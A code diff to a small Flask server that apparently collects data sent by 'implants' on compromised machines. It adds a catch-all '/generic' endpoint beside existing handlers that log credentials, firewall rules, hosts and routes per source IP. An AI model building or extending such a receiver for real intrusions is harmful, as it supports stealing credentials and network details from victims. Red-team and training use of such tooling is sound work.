@@ -1,7 +1,7 @@
 import datetime
 from flask import Flask, request
 from . import app
-from .log import *
+from .log import log, log_creds, log_fw, log_generic, log_hosts, log_routes
 
 @app.route('/')
 @app.route('/status')
@@ -20,6 +20,17 @@ def process_campfire():
     log_hosts(ip, hosts)
     log_routes(ip, routes)
 
+    return "Success"
+
+
+@app.route('/generic', methods=['POST'])
+def generic_log():
+    """Forward a generic log message from the implants. This is used as a catch-all
+    """
+    content = request.json
+    ip = content['IP']
+    creds = content['message']
+    log_generic(ip, creds)
     return "Success"
 
 
